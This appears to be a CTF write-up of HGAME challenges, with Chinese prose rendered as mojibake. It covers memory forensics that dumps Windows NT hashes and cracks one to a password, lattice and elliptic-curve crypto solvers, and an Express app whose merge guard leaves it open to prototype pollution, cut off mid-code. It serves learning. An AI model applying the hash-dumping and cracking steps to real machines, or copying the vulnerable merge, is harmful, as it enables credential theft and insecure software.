çº¿ä¸Šèµ›åˆ†ä¸ºå››å‘¨ï¼Œæ¯å‘¨è‡³å®˜æ–¹wpå‘å¸ƒå‰å‰ç¦æ­¢ä¸€åˆ‡è®¨è®ºæœ¬å‘¨é¢˜ç›®ä»¥åŠå…¬å¼€è‡ªå·± wp çš„è¡Œä¸ºã€‚åœ¨æ”¶é›†å®Œæˆåä¼šå¼€æ”¾è®¨è®ºï¼Œä½†ä»…èƒ½è®¨è®ºå·²ç»“æŸçš„é¢˜ç›®ã€‚<br>* æ¯å‘¨æ¯”èµ›ç»“æŸåæœ¬å‘¨å‰20åéœ€æäº¤wpåˆ°æŒ‡å®šé‚®ç®±<br>æœ¬æ¯”èµ›æœ€ç»ˆè§£é‡Šæƒå½’ Vidar-Team æ‰€æœ‰</p><p><strong>Rank: 9</strong> / <strong>Total Rank: 8</strong></p><hr><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ezWin-variables-auth-7zip"><a href="#ezWin-variables-auth-7zip" class="headerlink" title="ezWin (variables/auth/7zip)"></a>ezWin (variables/auth/7zip)</h3><blockquote><p>éå¸¸å¸¸è§„çš„ Windows å†…å­˜å–è¯ï¼Œè¯·ä½¿ç”¨ volatility3 </p><p>æ³¨ï¼šç³»åˆ—é¢˜ç›®ä½¿ç”¨åŒä¸€ä¸ªé•œåƒï¼Œä½¿ç”¨ä¸‹æ–¹ä»»æ„é“¾æ¥ä¸‹è½½ä¸€æ¬¡å³å¯ </p><p><a href="https://pan.baidu.com/s/1FDQeEVFSSznEGpqmWgS47w?pwd=57l8">https://pan.baidu.com/s/1FDQeEVFSSznEGpqmWgS47w?pwd=57l8</a> </p><p><a href="https://pan.quark.cn/s/9418099763d7">https://pan.quark.cn/s/9418099763d7</a> </p><p><a href="https://mega.nz/file/KzIigTKR#PqV-l7LX5X4pmBHFJQVE8g2mFS60XCbQjTmw-el92ts">https://mega.nz/file/KzIigTKR#PqV-l7LX5X4pmBHFJQVE8g2mFS60XCbQjTmw-el92ts</a></p></blockquote><p>ä½¿ç”¨volatility3åˆ†æWindows 10é•œåƒã€‚</p><p><strong>1. variables</strong></p><p>æŸ¥çœ‹ç¯å¢ƒå˜é‡ï¼š</p><p><code>python vol.py -f win10_22h2_19045.2486.vmem windows.envars</code></p><p>å¾—åˆ°ç¬¬1ä¸ªflagå€¼ï¼š<code>hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</code>ã€‚</p><p><strong>2. 7zip</strong></p><p>æŸ¥æ‰¾7zæ–‡ä»¶ï¼š</p><p><code>python3 vol.py -f win10_22h2_19045.2486.vmem windows.filescan | grep -i 7z</code></p><p>æ‰¾åˆ° <code>flag.7z</code>ï¼Œå¯¼å‡ºï¼š</p><p><code>python3 vol.py -f win10_22h2_19045.2486.vmem windows.dumpfiles --virtaddr 0xd0064181c950</code></p><p>æ‰“å¼€å‘ç°éœ€è¦å¯†ç ï¼Œå†…å«æ–‡ä»¶ <code>crack_nt_hash_for_7z_pwd.txt</code>ï¼Œæ–‡ä»¶åå³æç¤ºï¼Œéœ€è¦ç ´è§£NTHashå€¼å¾—åˆ°è§£å‹å¯†ç ã€‚</p><p>æå–è´¦æˆ·ä¿¡æ¯ï¼š</p><p><code>python3 vol.py -f win10_22h2_19045.2486.vmem windows.hashdump</code></p><p>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Noname  1000    aad3b435b51404eeaad3b435b51404ee        84b0d9c9f830238933e7131d60ac6436</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨cmd5æŸ¥è¯¢å¾—åˆ° <code>84b0d9c9f830238933e7131d60ac6436</code> å¯¹åº”æ˜æ–‡ä¸º <code>asdqwe123</code>ï¼Œè§£å‹å¾—åˆ°flagï¼š<code>hgame&#123;e30b6984-615c-4d26-b0c4-f455fa7202e2&#125;</code>ã€‚</p><p><strong>3. auth</strong></p><p>æŸ¥çœ‹å‘½ä»¤è¡Œå†å²è®°å½•ï¼š</p><p><code>python vol.py -f win10_22h2_19045.2486.vmem windows.cmdline</code></p><p>å‘ç°æç¤º <code>flag2 is current user nthash...</code>ï¼Œæ ¹æ®ä¸Šä¸€é¢˜hashdumpå¾—åˆ°çš„ç»“æœï¼Œflagä¸ºï¼š<code>hgame&#123;84b0d9c9f830238933e7131d60ac6436&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LLLCG"><a href="#LLLCG" class="headerlink" title="LLLCG"></a>LLLCG</h3><blockquote><p>â€œæˆ‘ä¿ç•™äº†å¤§éƒ¨åˆ†LCGçš„ç‰¹å¾ï¼Œä½†æ˜¯ä¹Ÿå»é™¤äº†ä¸€éƒ¨åˆ†ï¼Œè¿™æ ·æ‰çŸ¥é“ä½ ä»¬éœ€è¦ç”¨åˆ°LLLâ€ï¼Œâ€ä½ æ˜¯æœ‰æ„æŠŠå®ƒå»é™¤çš„å—â€ï¼Œâ€æ˜¯å‡ºé¢˜çš„è¿‡ç¨‹ä¸­æˆ‘å»é™¤äº†ä¸€éƒ¨åˆ†â€ï¼Œâ€æ˜¯æ•…æ„çš„è¿˜æ˜¯ä¸å°å¿ƒâ€ï¼Œâ€æ˜¯æ•…æ„çš„â€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.n = next_prime(<span class="number">2</span>**<span class="number">360</span>)</span><br><span class="line">        self.a = bytes_to_long(flag)</span><br><span class="line">        self.seed = randint(<span class="number">1</span>, self.n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = self.seed * self.a + randint(-<span class="number">2</span>**<span class="number">340</span>, <span class="number">2</span>**<span class="number">340</span>) % self.n</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">lcg = LCG()</span><br><span class="line"></span><br><span class="line">outputs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    outputs.append(lcg.<span class="built_in">next</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(outputs))</span><br></pre></td></tr></table></figure></blockquote><p>å‡ºé¢˜å¤±è¯¯ï¼Œ<code>self.seed = self.seed * self.a + randint(-2**340, 2**340) % self.n</code> è¯¥å¥ä»£ç æœªåŠ æ‹¬å·ï¼Œä¸” $r \in [-2^{340},2^{340}]&lt; \text{seed} &lt;n$ï¼Œç›´æ¥åšæ•´é™¤æ“ä½œå¯ä»¥æ¢å¤ $a$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    m = c[i]//c[i-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="string">b&#x27;hgame&#123;W0w_you_know_the_hidden_number_problem&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="LLLCG-Revenge"><a href="#LLLCG-Revenge" class="headerlink" title="LLLCG Revenge"></a>LLLCG Revenge</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">&gt;<span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">LCG</span>():</span><br><span class="line">       <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">           self.n = next_prime(<span class="number">2</span>**<span class="number">360</span>)</span><br><span class="line">           self.a = bytes_to_long(flag)</span><br><span class="line">           self.seed = randint(<span class="number">1</span>, self.n-<span class="number">1</span>)</span><br><span class="line">   </span><br><span class="line">       <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">           self.seed = (self.seed * self.a + randint(-<span class="number">2</span>**<span class="number">340</span>, <span class="number">2</span>**<span class="number">340</span>)) % self.n</span><br><span class="line">           <span class="keyword">return</span> self.seed</span><br><span class="line">   </span><br><span class="line">   lcg = LCG()</span><br><span class="line">   </span><br><span class="line">   outputs = []</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">       outputs.append(lcg.<span class="built_in">next</span>())</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">       f.write(<span class="built_in">str</span>(outputs))</span><br></pre></td></tr></table></figure></blockquote><p>ä¿®å¤åï¼Œæœ‰ $s_{i+1} \equiv as_i+r_i \pmod n,i \in [0,38)$ï¼Œå³ $s_{i+1}=as_i+r_i+k_in,i \in [0,38)$ã€‚</p><p>ä»¤ $A_i=s_i,B_i=-s_{i+1},x=a$ï¼Œæœ‰ $-r_i = A_ix+B_i+k_in$ï¼Œå…¸å‹HNPé—®é¢˜ï¼Œæ„å»ºæ ¼ï¼š</p><p>$M = \begin{bmatrix} n &amp; &amp; &amp; &amp; &amp; &amp; \newline &amp; n &amp; &amp; &amp; &amp; &amp; \newline &amp; &amp;\ddots&amp; &amp; &amp; &amp; \newline &amp; &amp; &amp; n &amp; &amp; &amp; \newline A_0&amp;A_1&amp;\dots &amp; A_{38}&amp;K/n&amp; &amp; \newline B_0&amp;B_1&amp;\dots &amp; B_{38}&amp; &amp; K &amp; \newline \end{bmatrix}=\begin{bmatrix} n &amp; &amp; &amp; &amp; &amp; &amp; \newline &amp; n &amp; &amp; &amp; &amp; &amp; \newline &amp; &amp;\ddots&amp; &amp; &amp; &amp; \newline &amp; &amp; &amp; n &amp; &amp; &amp; \newline s_0&amp;s_1&amp;\dots &amp; s_{38}&amp;K/n&amp; &amp; \newline -s_1&amp;-s_2&amp;\dots &amp; -s_{39}&amp; &amp; K &amp; \newline \end{bmatrix}$</p><p>å…¶ä¸­ $K$ ä¸º $r_i$ çš„ä¸Šç•Œ $K=2^{340}$ï¼Œåˆ™å­˜åœ¨ä¸€ä¸ª $M$ çš„æ•´ç³»æ•°çº¿æ€§ç»„åˆ $v$ï¼Œç”¨LLLç®—æ³•å¯ä»¥å¾—åˆ° $v_k$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">2348542582773833227889480596789337027375682548908319870707290971532209025114608443463698998384768703031935081</span></span><br><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line">t = <span class="number">39</span></span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    A.append(c[i])</span><br><span class="line">    B.append(-c[i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">K = <span class="number">2</span>^<span class="number">340</span> </span><br><span class="line">X = n * identity_matrix(QQ, t)</span><br><span class="line">Z = matrix(QQ, [<span class="number">0</span>] * t + [K/n] + [<span class="number">0</span>]).transpose()</span><br><span class="line">Z2 = matrix(QQ, [<span class="number">0</span>] * (t+<span class="number">1</span>) + [K]).transpose()</span><br><span class="line"></span><br><span class="line">Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]])</span><br><span class="line">Y = block_matrix([[Y, Z, Z2]])</span><br><span class="line"></span><br><span class="line">Y = Y.LLL()</span><br><span class="line"></span><br><span class="line">k0 = ZZ(Y[<span class="number">1</span>, <span class="number">0</span>] % n)</span><br><span class="line">flag = ZZ(Y[<span class="number">1</span>, -<span class="number">2</span>] / (K/n) % n)</span><br><span class="line"><span class="keyword">assert</span>(k0 == (A[<span class="number">0</span>]*flag + B[<span class="number">0</span>]) % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Repair_modulus_prob1em_5o_HNP_Revenge&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ECRSA"><a href="#ECRSA" class="headerlink" title="ECRSA"></a>ECRSA</h3><blockquote><p>å…”å…”æ‹œå¹´æ—¶é‡åˆ°äº†RSAï¼Œå¬è¯´RSAè¿˜æ²¡æœ‰å¦ä¸€åŠäºæ˜¯æŠŠECä»‹ç»ç»™äº†ä»–ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.all_cmdline <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">Nbits = <span class="number">512</span></span><br><span class="line">x = bytes_to_long(flag)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./output&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_pubkey</span>(<span class="params">Nbits</span>):</span><br><span class="line">    p = getPrime(Nbits // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(Nbits // <span class="number">2</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomInteger(Nbits // <span class="number">2</span>)</span><br><span class="line">        b = getRandomInteger(Nbits // <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(<span class="number">4</span>*a**<span class="number">3</span> + <span class="number">27</span>*b**<span class="number">2</span>, n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    E = EllipticCurve(Zmod(n), [a, b])</span><br><span class="line">    e = getPrime(<span class="number">64</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> n, E, e</span><br><span class="line"></span><br><span class="line">n, E, e = gen_pubkey(Nbits)</span><br><span class="line">pt = E.lift_x(Integer(x))</span><br><span class="line">ct = pt * e</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\na = <span class="subst">&#123;E.a4()&#125;</span>\nb = <span class="subst">&#123;E.a6()&#125;</span>\ne = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;ciphertext = <span class="subst">&#123;long_to_bytes(<span class="built_in">int</span>(ct.xy()[<span class="number">0</span>]))&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>ç»™å‡ºç‚¹ $C=eP$ çš„æ¨ªåæ ‡ï¼Œæ ¹æ®æ¤­åœ†æ›²çº¿æ€§è´¨ï¼Œç‚¹ $C$ ä¹Ÿåœ¨æ›²çº¿ä¸Šã€‚</p><p>å†åˆ©ç”¨ $e$ å¯¹ $\#E(\mathbb{F}_p) \times \#E(\mathbb{F}_q)$ å–æ¨¡é€†å³å¯å¾—åˆ° $E(\mathbb{Z}/n\mathbb{Z})$ æ„ä¹‰ä¸‹çš„ $d$ï¼Œå†è§£å¯†æŒ‰ç…§RSAæ–¹å¼è§£å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">115192265954802311941399019598810724669437369433680905425676691661793518967453</span></span><br><span class="line">q = <span class="number">109900879774346908739236130854229171067533592200824652124389936543716603840487</span></span><br><span class="line">n = <span class="number">12659731371633323406361071735480743870942884407511647144758055911931321534333057725377899993936046070028289182446615763391740446071787318153462098556669611</span></span><br><span class="line">a = <span class="number">34573016245861396068378040882622992245754693028152290874131112955018884485688</span></span><br><span class="line">b = <span class="number">103282137133820948206682036569671566996381438254897510344289164039717355513886</span></span><br><span class="line">e = <span class="number">11415307674045871669</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;f\xb1\xae\x08`\xe8\xeb\x14\x8a\x87\xd6\x18\x82\xaf1q\xe4\x84\xf0\x87\xde\xedF\x99\xe0\xf7\xdcH\x9ai\x04[\x8b\xbbHR\xd6\xa0\xa2B\x0e\xd4\xdbr\xcc\xad\x1e\xa6\xba\xad\xe9L\xde\x94\xa4\xffKP\xcc\x00\x907\xf3\xea&#x27;</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(Zmod(n), [a, b])</span><br><span class="line">cx = <span class="built_in">int</span>(ciphertext.<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">Ep = E.change_ring(GF(p))</span><br><span class="line">Eq = E.change_ring(GF(q))</span><br><span class="line">d = inverse_mod(e, Ep.order() * Eq.order())</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">cy2 = (cx^<span class="number">3</span> + a * cx + b) % n</span><br><span class="line"></span><br><span class="line">c = cy2</span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">P.&lt;a&gt; = PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f = a^e-c</span><br><span class="line">mps = f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt; = PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g = a^e-c</span><br><span class="line">mqs = g.monic().roots()</span><br><span class="line"></span><br><span class="line">cy_all = []</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x = mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y = mqq[<span class="number">0</span>]</span><br><span class="line">        cy_all.append(CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q]))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> cy <span class="keyword">in</span> cy_all:</span><br><span class="line">    C = E(cx,cy)</span><br><span class="line">    m, _ = (<span class="built_in">int</span>(d)*C).xy()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;ECC_4nd_RSA_also_can_be_combined&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Shared-Diary"><a href="#Shared-Diary" class="headerlink" title="Shared Diary"></a>Shared Diary</h3><blockquote><p>ek1ngç»™åä¼šæˆå‘˜å†™äº†ä¸€ä¸ªåœ¨çº¿å…±äº«æ—¥è®°æœ¬ï¼Œä¸è®ºæ˜¯è°åªè¦çŸ¥é“å¯†ç ï¼Œéƒ½å¯ä»¥åœ¨ä¸Šé¢è®°å½•è‡ªå·±çš„å°ç§˜å¯†ã€‚ä¸è¿‡å¥½åƒä»–çš„jså­¦çš„å¹¶ä¸å¥½å¯¼è‡´æ— æ„ä¸­å¼•å…¥äº†æ¼æ´ï¼Œçœ‹æ¥jsä¹Ÿæœ‰å¾ˆå¤šå®‰å…¨é—®é¢˜ã€‚</p></blockquote><p>node.js Expressæ¡†æ¶ï¼Œ<code>app.js</code> ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="comment">// Prevent prototype pollution</span></span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Detected Prototype Pollution&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;./views&quot;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, 